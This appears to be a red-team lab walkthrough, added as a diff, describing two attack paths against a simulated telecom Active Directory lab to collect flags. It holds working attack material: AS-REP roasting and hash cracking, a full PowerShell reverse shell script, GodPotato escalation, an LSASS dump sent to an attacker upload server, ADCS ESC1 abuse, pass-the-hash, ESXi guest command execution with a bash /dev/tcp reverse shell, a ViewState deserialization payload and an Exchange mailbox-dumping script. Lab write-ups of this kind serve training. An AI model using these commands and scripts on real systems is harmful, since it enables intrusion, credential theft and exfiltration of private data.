@@ -1,0 +1,715 @@
+UnAuthenticated Attack Path :
+Objective:
+To conduct a targeted cyber operation against “TELECOM INC.” with the primary goal of
+compromising the critical servers and exfiltrating sensitive data (e.g., financial records,
+internal communications). The operation will simulate a telecom motivated Advanced
+Persistent Threat (APT) attack, leveraging advanced tradecraft to evade detection while
+achieving mission objectives. Access to the internal environment is provided and starts
+in an unauthenticated fashion.
+Scope of Engagement:
+1. Target:
+○ Primary Objective: Gain unauthorized access to the TELECOM INC critical
+servers.
+○ Secondary Objective: Extract sensitive data (PII, account details, internal
+memos).
+○ Initial Access IP Address : 10.5.2.0/24 [10.5.2.1 out of scope]
+2. Tactics & Techniques (Simulated APT Approach):
+○ Initial Access:
+■ Gather Information via DNS Zone Transfer
+■ Perform ASREP Roasting
+○ Privilege Escalation:
+■ Compromise SQL Server & escalate to SYSTEM
+■ Dump credentials from LSASS
+○ Lateral Movement:
+■ Exploit ESC1 from certificate server
+■ RCE on Domain Controller
+○ Data Exfiltration:
+■ Discover domain joined ESXi
+■ Command execution on the ESXi
+■ Command execution on the ESXi Guest VM
+3. Rules of Engagement (ROE):
+○ Avoid disruption: Do not crash systems or trigger incident response
+unnecessarily.
+○ Legal compliance: Operate under authorized red team agreements.
+4. Deliverables:
+○ Post-Compromise Report:
+■ Attack timeline & techniques used
+■ Security recommendations (patch weak credentials, MFA
+enforcement).
+■ [IMP] Hack & Collect Flags as you progress through the
+environment.
+Shell
+Shell
+Shell
+Shell
+#Mapping the entire Infrastructure :
+DNS are the backbone of the entire network, let’s scan those and identify misconfigurations:
+nmap -sU -p 53 --open 10.5.2.0/24
+We got a DNS server running on 10.5.2.2 & 10.5.2.99. We can test “10.5.2.99”
+Let’s add this DNS Server to our attacker machine “resolv” configuration file.
+sudo nano /etc/resolv.conf
+#nameserver <NAT IP>
+nameserver 10.5.2.99
+First of all we will do PTR records sweep (IP to FQDN) to understand any existing reverse
+records.
+for i in {1..254}; do echo -n "10.5.2.$i "; dig +short -x 10.5.2.$i; done >
+/tmp/ptrs.txt
+We obtained host mappings via PTR sweep. The domain name is “telecore.ad”. Next, we
+attempt a reverse zone transfer (AXFR).
+#Zone Transfer :
+dig @10.5.2.99 2.5.10.in-addr.arpa AXFR
+This will yield the results which means reverse zone transfer is allowed and we have
+dumped the complete reverse zones.
+Shell
+Shell
+Test for forward zone transfer, Query the DNS server for general/any records for the
+discovered domain. This yields SOA/NS/MX records of the entire domain.
+dig @10.5.2.99 telecore.ad AXFR
+Amazingly, using the AXFR protocol we have done forward, reverse DNS Zone Transfer
+and have access to all the machines IP & domain mapping.
+Let’s use this information to do enumeration as we know that the Domain Controller IP is
+10.5.2.2. We will use LDAP / LDAPS to query the directory database on the Domain
+Controller.
+We will use LDAP to query the domain using “ldapsearch” as an anonymous user.
+-x : simple authentication (instead of SASL)
+-H : target LDAP/S server
+-b : search base (base domain component)
+If the domain is "hello.com" then the search base is "DC=HELLO,DC=COM"
+#Query the Domain Context:
+ldapsearch -x -H ldap://10.5.2.2 -s base
+#Search all the Groups & it's attributes :
+ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=group'
+Enumerate and check all the domain users using LDAP.
+Shell
+Shell
+#Search all the Users & it's attributes :
+ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=user'
+name distinguishedName
+Let’s create a “names” text file containing all the listed users (check the Users tag)
+Perform ASREPRoasting by checking the domain users which have “DO NOT Require
+Kerberos PREAUTH” attribute set :
+#Setup a virtual environment & then install impacket :
+python3 -m virtualenv myenv
+source myenv/bin/activate
+pip3 install impacket
+Shell
+#Impacket command to check the users which have "DO NOT Require Kerberos
+PREAUTH"
+impacket-GetNPUsers telecore.ad/ -dc-ip 10.5.2.2 -usersfile names -format
+hashcat | grep -v 'Kerberos SessionError'
+Amazingly, we have found that the “tel_support01” domain user has the “DO NOT
+REQUIRE PREAUTH” attribute set. Next we will put those in a hash file & crack it using
+hashcat.
+echo 'extracted_hash' > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep hash
+NOTE : We suggest using “rockyou.txt” dictionary for the hash cracking.
+The credentials of the “tel_support01” domain user has been identified.
+Woohoo! We got a working domain user credential. Next step would be to spray the
+credentials & enumerate for initial foothold.
+Shell
+Shell
+#Spray & Access MSSQL Server :
+Let’s first check all the computers available in the domain.
+ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD'
+'objectClass=computer' name distinguishedName
+Cool, we identified critical roles like SQL Server is running in the domain, let’s try to access
+the SQL-SRV using the cracked credentials for initial access.
+For access, we will use Impacket MSSQL Client.
+impacket-mssqlclient tel_support01:'<Cracked_Pass>'@10.5.2.22 -debug
+-windows-auth
+Shell
+Upon execution, we can confirm that “tel_support01” can login to the machine & possess
+access to the SQL Server.
+Now, let’s confirm if the user contains “syadmin” or “DB Admin” rights by trying to enable
+the “xp_cmdshell” extended stored procedure. If it can, it means we can perform Code
+Execution on the machine.
+enable_xp_cmdshell
+xp_cmdshell whoami
+It is confirmed that now we can perform OS Level commands. The SQL-Srv is running as
+“nt service\ mssql$sqlexpress” service account.
+Take reverse shell as “nt service\mssql$sqlexpress”
+Once the execution functionality is enabled, we can now take reverse shell of the SQL
+Server :
+Shell
+Since, the target environment is windows, we can use powershell encoded reverse shell
+script to give us a reverse shell.
+This website instantly generates the reverse shell, upon entering relevant details
+Let’s pass this as a command in our MSSQL session as “sysadmin” user. But before this
+start your listener on attacker machine :
+#Attacker Machine :
+nc -nlvp 2345
+xp_cmdshell powershell -e <encoded__reverse_shell_command>
+Execute the malicious encoded powershell reverse shell.
+Catch the shell on the listener.
+Shell
+Shell
+Let’s now enumerate the local environment & the privileges assigned to the local service
+account.
+whoami /priv
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+We have “SeImpersonatePrivilege” Enabled. The OS version is enumerated as follows :
+On Server 2022 Standard with this build, we can try to escalate from the local service
+account to “nt authority\system”
+Please note that “SeImpersonate” Privileges are required to perform the same.
+We will use GodPotato to perform the operation, download it on the machine & execute the
+following commands :
+#Download the file on the SQL-Srv machine
+cd C:\Users\Public\
+Shell
+Shell
+iwr -UseBasicParsing http://<VPN_IP>:8080/GodPotato-NET4.exe -OutFile
+GodPotato-NET4.exe
+#Execute the following to
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+Now, let’s take a reverse shell as SYSTEM.
+#Update your VPN IP in the following PS script:
+cat rev.ps1
+$client = New-Object
+System.Net.Sockets.TCPClient('YOUR_VPN_IP',1234);$stream =
+$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
+$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object
+-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback =
+(iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' +
+(pwd).Path + '> ';$sendbyte =
+([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sen
+dbyte.Length);$stream.Flush()};$client.Close()
+#Covert the script to base64 :
+cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0
+#Start listener on attacker machine :
+nc -nlvp 1234
+#Execute the following with your base64 encoded payload on the SQL-Srv :
+Shell
+Shell
+cmd /c GodPotato-NET4.exe -cmd "powershell -nop -w hidden -enc AAAAA.."
+Let’s dump the credentials with system privileges.
+Since this is patched Windows Server 2022, we will use the in-built functionality to dump
+the process & then extract the credentials out.
+tasklist /fi "imagename eq lsass.exe"
+Note the process id of the lsass. We will use the Minidump from “comsvcs.dll”.
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID>
+C:\users\Public\lsass.dmp full
+This is around 56MB, let’s compress it & transfer it back to the attacker machine for further
+analysis.
+Shell
+Shell
+Compress-Archive -Path lsass.dmp -DestinationPath lsass.zip
+The zip size is now around 21 MB which is feasible to transfer.
+We will use the following python code as a server on the attacker machine.
+# Simple HTTP Server with Upload in Python3, to be run on Attacker Machine:
+import http.server
+import socketserver
+import os
+class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
+def do_POST(self):
+content_length = int(self.headers['Content-Length'])
+post_data = self.rfile.read(content_length)
+# Get the filename from the path (use the requested URL or a
+default)
+filename = os.path.basename(self.path) or 'uploaded_file.zip'
+# Write the data to a file
+with open(filename, 'wb') as f:
+f.write(post_data)
+# Send a response back to the client
+self.send_response(200)
+self.end_headers()
+self.wfile.write(b'File uploaded successfully!')
+print(f"\n[+] File received and saved as: {filename}")
+PORT = 8000
+Handler = MyHttpRequestHandler
+with socketserver.TCPServer(("", PORT), Handler) as httpd:
+print(f"[+] Server started on port {PORT}")
+print("[+] Waiting for file upload from Windows client...")
+httpd.serve_forever()
+Shell
+Shell
+From our SYSTEM shell on the MSSQL Server, let’s transfer the zip file.
+Invoke-WebRequest -Uri "http://<VPN_IP>:8000/lsass.zip" -Method Post -InFile
+"C:\Users\Public\lsass.zip" -Verbose
+NOTE : It might throw error that the Internet Explorer engine is not
+available, but looking at broad view the file is already transferred.
+Within a minute, you will find the zip file is successfully transferred.
+Unzip the file & then use pypykatz to parse the file and extract the credentials.
+#Attacker Machine :
+unzip lsass.zip
+pypykatz lsa minidump lsass.dmp
+.
+Shell
+#Certificate Service to Domain Admins :
+With the discovered credentials of “tel_engineer01” we will hunt for the ADCS Servers in the
+environment.
+From the enumeration, we came to know that there is one PKI installed in the “telecore.ad”
+environment.
+NOTE : If you are using kali, certipy-ad is preinstalled, if not you can use “pip3 install
+certipy” to install in your virtual environment.
+pip3 install certipy-ad
+certipy-ad find -u 'tel_engineer01@telecore.ad' -hashes <Hash> -dc-ip
+10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout
+Seems like we have enrollment rights & the Remarks shows that we can perform ESC1 as
+the template requires to specify any Subject Alternative Name (SAN).
+Shell
+Shell
+Before exploitation, we will enumerate the SID of the domain administrator. As Microsoft
+fixed Certifried (CVE-2022–26923) by adding SID Extension Policy Module. We need a
+SAN user SID & specify when requesting the certificate.
+rpcclient --user 'telecore.ad/tel_engineer01' --pw-nt-hash 10.5.2.2 -c
+"lookupnames administrator"
+NOTE : Enter "tel_engineer01" NT hash when asked for password
+Let’s request the certificate with the domain administrator in the SAN.
+certipy-ad -debug req -u 'tel_engineer01@telecore.ad' -hashes <HASH> -target
+10.5.2.8 -ca 'telecore-PKI-SRV-CA' -template 'Tel_User' -upn
+'administrator@telecore.ad' -sid 'Admin_SID'
+NOTE : Update the highlighted values
+Retrieve the Domain Administrator Hash :
+Shell
+certipy-ad -debug auth -pfx administrator.pfx -dc-ip 10.5.2.2
+Boom, the administrator hash has been received so the TGT, now we can attempt
+connection to the Domain Controller either with Kerberos or the NTLM Hash.
+Shell
+#RCE on Domain Controller (DC01) :
+We will proceed with the NTLM Hash :
+#On Attacker Machine
+#List the File Systems :
+smbclient -L 10.5.2.2 -U 'administrator%HASH' --pw-nt-hash
+#Connect to Domain Controller using Impacket WMIExec :
+wmiexec.py -hashes :<HASH> 'administrator@10.5.2.2'
+With this we have achieved Domain Admin Privileges. Let’s check the Domain Groups. An
+interesting group called “ESX Admins” is present in the domain.
+ESXi are hypervisors which are used to run Virtual Machines (VMs) workloads and are
+treated as critical servers.
+Shell
+Shell
+#Attacking Hypervisor in AD Environment:
+The next step would be to access the inner critical servers like ESXi.
+With our previous understanding of the domain environment via DNS Zone transfer, we
+already knew that “ESXi-VD” is running at 10.5.2.111, let’s scan the open services.
+#Attacker Machine
+nmap -sT -sV 10.5.2.111
+HTTPS is active, upon visiting the web service it is not serving anything.
+SSH is active and we do not have the clear text credential of the Domain Admin, since SSH
+only supports key and password based login, it only leaves us with the NT Hash cracking
+option.
+We will use hashcat to crack the password as we did last time. Store the DA hash in a
+“DA_Hash.txt” file.
+#Store the DA NTLM Hash in the "DA_Hash.txt" file :
+hashcat -m 1000 -a 0 DA_Hash.txt /usr/share/wordlists/rockyou.txt
+Shell
+The Domain Admin NTLM hash is cracked.
+Now, with it, we can either SSH & perform manual tool operations or create an automation
+script for enumerating the hypervisor environment.
+We will go with the 2nd option.
+Our script will connect to the ESXi and perform the following actions :
+- Check the availability of the Guest VMs
+- Check whether VMWare Tools are installed or not
+- When VMware Tools are present, an attacker with ESXi root privileges can
+abuse management APIs and tooling to execute arbitrary actions against the
+host and its guests.
+- Scrape the Annotations / Notes field
+- High probability of admin writing credentials
+#Install the pyVmomi package for operations on the ESXi:
+pip3 install pyVmomi
+#Extract Guest VM State using PyVmomi Library, enum_vms.py, Update the DA
+Password:
+#!/usr/bin/env python3
+import ssl
+from pyVim.connect import SmartConnect, Disconnect
+from pyVmomi import vim
+ctx = ssl._create_unverified_context()
+si = SmartConnect(host="10.5.2.111", user="administrator@telecore.ad",
+pwd="<Admin_Pass>", sslContext=ctx)
+content = si.RetrieveContent()
+Shell
+for vm in content.viewManager.CreateContainerView(content.rootFolder,
+[vim.VirtualMachine], True).view:
+ip = vm.guest.ipAddress or
+(vm.guest.net[0].ipConfig.ipAddress[0].ipAddress if vm.guest.net else "N/A")
+print(f"VM: {vm.name}\n Power: {vm.runtime.powerState}\n OS:
+{vm.config.guestFullName}\n Tools: {vm.guest.toolsStatus}\n IP: {ip}\n
+Notes: {vm.config.annotation}\n")
+Disconnect(si)
+#Run : python3 enum_vms.py
+It has been identified that
+- “VaultVM” is present inside the ESXI Server.
+- The IP along with the power state is disclosed.
+- Guest VM Credentials is hardcoded & present in the Annotations / Notes field
+- Most importantly, VMWare Tools are installed
+With the cherry on the top, we have root privileges on the ESXi. This is the perfect scenario
+for code execution against the guest linux machine.
+Since the “10.5.2.50” is in the same range, we will try to take the reverse shell of the Guest
+Vault-VM.
+Let’s run this script :
+#Command Execution on the Guest VMs inside ESXI via VMWare Tools,
+cmd_exec.py:
+import ssl, argparse, sys, time
+from pyVim import connect
+from pyVmomi import vim
+Shell
+ap = argparse.ArgumentParser()
+ap.add_argument("--host"); ap.add_argument("--user");
+ap.add_argument("--password")
+ap.add_argument("--vm"); ap.add_argument("--guest-user");
+ap.add_argument("--guest-pass")
+ap.add_argument("--cmd"); ap.add_argument("--args", default="")
+a = ap.parse_args()
+si = connect.SmartConnect(host=a.host, user=a.user, pwd=a.password,
+sslContext=ssl._create_unverified_context())
+vm = [v for v in
+si.content.viewManager.CreateContainerView(si.content.rootFolder,[vim.Virtua
+lMachine],True).view if v.name==a.vm][0]
+pm = si.content.guestOperationsManager.processManager
+auth =
+vim.NamePasswordAuthentication(username=a.guest_user,password=a.guest_pass)
+pid =
+pm.StartProgramInGuest(vm,auth,vim.vm.guest.ProcessManager.ProgramSpec(progr
+amPath=a.cmd,arguments=a.args))
+print(f"Started PID {pid}")
+time.sleep(2)
+print(pm.ListProcessesInGuest(vm,auth,[pid])[0].exitCode)
+connect.Disconnect(si)
+Save the script & run the following command:
+#Update the DA_Pass & VPN_IP in the command:
+python3 cmd_exec.py --host 10.5.2.111 --user administrator@telecore.ad
+--password 'DA_Pass' --vm 'VaultVM' --guest-user linux --guest-pass 'PASS'
+--cmd /bin/bash --args "-c 'bash -i >& /dev/tcp/<VPN_IP>/5556 0>&1'"
+Help :
+--host : ESXi Host IP
+--user : Domain Admin UserName
+--password : Domain Admin Password
+--guest-user : Guest VM UserName
+--guest-pass : Guest VM Password
+And like that we get the reverse shell :
+We are in the Guest VM i.e Vault VM.
+Next check the final flag present in the Desktop directory.
+Congratulations, you’ve completed Path 1.
+You started as an unauthenticated red teamer and successfully navigated every challenge to
+reach the finish. Well done, you’ve earned this win; onward to the next path!
+If you like this lab give a shoutout at social media platforms :)
+See you in Path 2 :)
+
+
+
+
+
+
+
+
+
+Authenticated Attack Path:
+Objective:
+To conduct a targeted cyber operation against “TELECOM INC.” with the primary goal of
+compromising the critical servers and exfiltrating sensitive data (e.g., financial records,
+internal communications). The operation will simulate a telecom motivated Advanced
+Persistent Threat (APT) attack, leveraging advanced tradecraft to evade detection while
+achieving mission objectives. Access to the internal environment is provided and starts
+in an authenticated fashion.
+Scope of Engagement:
+1. Target:
+○ Primary Objective: Gain unauthorized access to the TELECOM INC critical
+servers.
+○ Secondary Objective: Extract sensitive data (PII, account details, internal
+memos).
+○ Initial Access IP Address : 10.5.2.10
+2. Tactics & Techniques (Simulated APT Approach):
+○ Initial Access:
+■ Exploiting public-facing services via malicious viewstate
+○ Privilege Escalation:
+■ Sensitive information disclosure
+■ Certificate service abuse
+○ Lateral Movement:
+■ Move to Domain Controller
+■ Abuse Exchange Server
+○ Data Exfiltration:
+■ Stealthy data compression & exfil via encrypted channels.
+3. Rules of Engagement (ROE):
+○ Avoid disruption: Do not crash systems or trigger incident response
+unnecessarily.
+○ Legal compliance: Operate under authorized red team agreements.
+4. Deliverables:
+○ Post-Compromise Report:
+■ Attack timeline & techniques used
+■ Security recommendations (patch weak credentials, MFA
+enforcement).
+■ [IMP] Hack & Collect Flags from the path.
+Shell
+Shell
+#Abuse malicious VIEWSTATE in IIS Server :
+Scan the initial access IP :
+nmap -sV 10.5.2.10
+Web service is running on TCP Port 80. We will visit the web application via browser.
+http://10.5.2.10
+Upon visiting we can see the Telecommunication application is running :
+Let’s check the page source of the home page “view-source:http://10.5.2.10/default.aspx”.
+We can see the presence of the aspNetHidden class and other types.
+Shell
+This is standard ASP.NET Web Forms markup. This means the page is using ViewState and
+it is enabled. The two hidden fields are used by ASP.NET to manage the page's state
+between postbacks.
+- __VIEWSTATE : base64-encoded serialized state of the page controls
+- __VIEWSTATEGENERATOR : Unique identifier used in the hashing process to prevent
+tampering.
+Next, we will visit the “Reports” page and view any uploaded reports. Upon opening any
+reports, we can see a “?report” parameter reading and parsing the contents from the file
+system.
+We can try for classic Local File Inclusion (LFI)
+Since this project is present in ASP, we will check for the presence of the web.config file.
+http://10.5.2.10/network-reports.aspx?report=web.config
+Amazingly, we got the config file and upon checking it contains the hardcoded machine
+validation key. We will abuse the ViewState and try to achieve Remote Code Execution.
+We require the following :
+1. ViewState Generator : CA0B0334, Unique Identifier present in the home page
+2. Algorithm : SHA1, Present in the web.config file
+3. ValidationKey :
+56AB7132992003EE87F74AE4D9675D65EED8018D3528C0B8874905B51940DEAF6B85F1
+D922D19AB8F69781B2326A2F978A064708822FD8C54ED74CADF8592E17, Present in
+the web.config file
+Shell
+With all these details, we will craft a malicious viewstate.
+The flow is to create a malicious object, serialize it into the ViewState format, and then sign it
+with the validation key and algorithm we stole from the web.config file
+Now, we will use the ysoserial forked project to generate a malicious viewstate.
+The reverse shell will be generated from this project.
+The final attack command looks like this :
+.\ysonet.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO
+AGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADgA
+LgAyACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBH
+AGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAA
+MAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0
+AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4A
+TABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3
+AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgA
+dAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABi
+AHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgA
+IAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABz
+AGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIA
+IAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0
+AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkA
+LgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBt
+Shell
+AC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUA
+LgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBs
+AGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --generator=CA0B0334
+--validationalg="SHA1"
+--validationkey="56AB7132992003EE87F74AE4D9675D65EED8018D3528C0B8874905B5194
+0DEAF6B85F1D922D19AB8F69781B2326A2F978A064708822FD8C54ED74CADF8592E17"
+NOTE : Do not Copy / Paste the above command as the base64 reverse shell blob
+would be different in your case.
+This will generate a malicious Viewstate with a reverse shell parameter as shown below
+(screenshot is highly cropped).
+Make sure that we copy the exact output. The next step would be to head to the Home page
+where web forms are present and capture the request.
+Simultaneously start the reverse shell listener on the attacker machine :
+nc -nlvp 1234
+Go to the Home Page & then Initiate a POST request from the home page.
+Capture the POST request using burpsuite and Modify the “__VIEWSTATE” parameter with
+the malicious viewstate generated using ysoserial as follows :
+NOTE : The Viewstate encoding is not required. Paste the generated output as it is.
+The IIS Server will process our Malicious Viewstate and provide us the reverse shell.
+Shell
+Shell
+As an application server, we already read the web.config file and found the keys. At this
+stage either we escalate our privileges to the SYSTEM or search for low hanging fruits like
+credentials etc.
+We can confirm that an application called “TelecomApp” is running in the machine by
+visiting the “C:\Program Files\TelecomApp” directory. However, it only contains an exe &
+no further information.
+Let’s search for the credentials in the other locations like the registry. Since we know that an
+application is running we will query the SOFTWARE location of the registry.
+reg query 'HKEY_LOCAL_MACHINE\SOFTWARE\'
+We found the “TelecomApp” registry location, and checked the values.
+reg query 'HKEY_LOCAL_MACHINE\SOFTWARE\TelecomApp'
+The Credentials are found in the HKLM location. This suggests the credentials meant to be
+read by multiple processes.
+An application developer would only store a secret in a globally readable location like HKLM
+if it was also intended to be decoded by any process on the machine.
+Shell
+We are now left with 2 options, which need to be tested using trial & error, the encoded
+domain user creds, either is encrypted in “CurrentUser” or “LocalMachine” scope.
+We will attempt with “LocalMachine” scope first following :
+# Load the required assembly
+Add-Type -AssemblyName System.Security
+# Read the encrypted blob from the registry (replace with your key)
+$encryptedString = (reg query 'HKLM\SOFTWARE\TelecomApp' /v
+EncryptedPassword | findstr 'REG_SZ')
+$encryptedString = $encryptedString.Trim() -replace '^.*REG_SZ\s+', ''
+$encryptedBytes = [Convert]::FromBase64String($encryptedString)
+$decryptedBytes =
+[System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes,
+$null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
+$plaintextPassword = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+$plaintextPassword
+The Base64 string was decoded, and the resulting DPAPI blob was decrypted using the
+system’s machine key, recovering the plaintext credentials.
+With the “tel_admin01” credentials we will now target the other servers.
+Shell
+Shell
+Shell
+#Exploit mis-configurations in CA Templates:
+We will check the CA server for the misconfigured templates.
+#Attacker Machine:
+certipy-ad -debug find -u 'tel_admin01@telecore.ad' -p '<PASS>' -dc-ip
+10.5.2.2 -vuln -ldap-scheme ldap -stdout
+Request the SID of the administrator.
+rpcclient --user 'telecore.ad/tel_admin01' --password 'T3l@Com#1' 10.5.2.2
+-c "lookupnames administrator
+Request certificate for Domain Admin :
+certipy-ad -debug req -u 'tel_admin01@telecore.ad' -p '<PASS>' -target
+10.5.2.8 -ca 'telecore-PKI-SRV-CA' -template 'Badges' -upn
+'administrator@telecore.ad' -sid
+'S-1-5-21-1588247407-410625039-1511794522-500'
+Shell
+Shell
+Authenticate with the certificate to get the NT Hash :
+certipy-ad -debug auth -pfx administrator.pfx -dc-ip 10.5.2.2
+List the shares of the Domain Controller :
+smbclient -L 10.5.2.2 -U 'administrator%<HASH>' --pw-nt-hash
+We will connect via smbclient & enumerate for low hanging fruits.
+Shell
+Shell
+Shell
+smbclient \\\\10.5.2.2\\C$ -U 'administrator%<HASH>' --pw-nt-hash
+We can perform multiple attacks like credential dumping and what not. Let’s try checking the
+scheduled tasks.
+cd Windows\System32\Tasks
+dir
+Out of all the tasks, we can find “Exchange MailBox Programmatic Access” to be
+interesting. Let’s download this locally & check the contents.
+get "Exchange MailBox Programmatic Access"
+On another terminal check the contents of the downloaded file.
+Upon viewing the downloaded file “cat ‘Exchange MailBox Programmatic Access’” we
+identified that these tasks run impersonate.ps1 powershell script.
+Shell
+On the smbclient shell, again we will download this file and analyze the contents.
+cd ..\..\..\
+cd Users\Administrator\Downloads
+get impersonate.ps1
+Upon noticing the script, we can see that the discovered account is able to access
+“administrator@telecore.ad” mailboxes in the domain which means this user is provided
+with either delegation or impersonation rights.
+Now, we will use the discovered user rights to access the administrator mailbox. For that we
+will target the exchange server.
+Python
+#Exchange Server :
+We will now check the exchange & snoop into the “administrator” mailbox.
+Before accessing mailboxes, it’s important to determine whether “tel_ops1” has
+Impersonation or Delegate rights.
+Impersonation allows full programmatic access to multiple mailboxes, while Delegate access
+is limited to specific mailboxes assigned by an admin.
+#Install exchange library
+python3 -m virtualenv myenv
+source myenv/bin/activate
+pip3 install exchangelib
+#Update the Hosts file:
+sudo nano /etc/hosts
+10.5.2.16 ex-srv.telecore.ad
+#!/usr/bin/env python3
+from exchangelib import Credentials, Account, Configuration, DELEGATE,
+IMPERSONATION, Folder
+from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter
+import urllib3
+urllib3.disable_warnings()
+BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter
+def check_access(user, pwd, server, target):
+creds = Credentials(username=user, password=pwd)
+config = Configuration(server=server, credentials=creds)
+# Check Delegate
+try:
+acc = Account(primary_smtp_address=target, config=config,
+autodiscover=False, access_type=DELEGATE)
+# Try to open Inbox
+_ = acc.inbox.total_count
+print(f"[+] {user} has DELEGATE access on {target}")
+except Exception:
+print(f"[-] No Delegate access for {target}")
+# Check Impersonation
+try:
+acc = Account(primary_smtp_address=target, config=config,
+autodiscover=False, access_type=IMPERSONATION)
+Python
+_ = acc.inbox.total_count
+print(f"[+] {user} has IMPERSONATION rights on {target}")
+except Exception:
+print(f"[-] No Impersonation rights for {target}")
+if __name__ == "__main__":
+check_access("tel_ops1@telecore.ad", "<Discovered Password>",
+"ex-srv.telecore.ad", "administrator@telecore.ad")
+NOTE : Update the discovered password in the above script.
+It has been confirmed that “tel_ops1” has “IMPERSONATE” rights. Which means it can
+access multiple mailboxes.
+We have the permissions to dump all the users' mailboxes. With these permissions, let’s
+dump all the emails of the domain administrator “administrator@telecore.ad”, we will target
+the Inbox, Sent & Drafts folder.
+The following python script will connect to the domain admin mailboxes and collect
+emails & store them in a txt file.
+#!/usr/bin/env python3
+import os
+from exchangelib import Credentials, Account, Configuration, IMPERSONATION
+from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter
+import urllib3
+urllib3.disable_warnings()
+BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter
+def extract_mailbox_items(user, password, exchange_server, target_mailboxes,
+output_file="results.txt"):
+print(f"[*] Checking mailbox access for: {target_mailboxes}")
+creds = Credentials(username=user, password=password)
+config = Configuration(server=exchange_server, credentials=creds)
+results = []
+try:
+Account(
+primary_smtp_address=user,
+config=config,
+autodiscover=False,
+access_type=IMPERSONATION
+)
+print("[+] Connected to Exchange\n")
+for target in target_mailboxes:
+print(f"[*] Extracting items from: {target}")
+try:
+target_account = Account(
+primary_smtp_address=target,
+config=config,
+autodiscover=False,
+access_type=IMPERSONATION
+)
+folder_map = {
+"Inbox": target_account.inbox,
+"Sent": target_account.sent,
+"Drafts": target_account.drafts
+}
+for name, folder in folder_map.items():
+print(f" [+] Reading {name}...")
+for item in
+folder.all().order_by('-datetime_created')[:20]: # limit 20 per folder
+body = (item.text_body or "").replace("\n", "
+").strip()
+snippet = body[:200] + ("..." if len(body) > 200
+else "")
+line = f"[{target} - {name}]
+{item.subject}\n{snippet}\n"
+results.append(line)
+except Exception as e:
+err = f"[!] ACCESS DENIED to {target}: {str(e)[:100]}\n"
+results.append(err)
+print(err.strip())
+except Exception as e:
+print(f"[-] Connection failed: {e}")
+# Always write results to file
+with open(output_file, "w", encoding="utf-8") as f:
+if results:
+f.write("\n".join(results))
+else:
+f.write("[!] No items extracted.\n")
+print(f"\n[+] Extraction complete. Results saved to:
+{os.path.abspath(output_file)}")
+return results
+if __name__ == "__main__":
+targets = ["administrator@telecore.ad"]
+extract_mailbox_items(
+user="tel_ops1@telecore.ad",
+password="<Pass>",
+exchange_server="ex-srv.telecore.ad",
+target_mailboxes=targets,
+output_file="results.txt"
+)
+Please note that we are able to extract the emails because we have impersonation
+permissions to read all the mailboxes.
+All the emails are dumped and present in the “results.txt” file
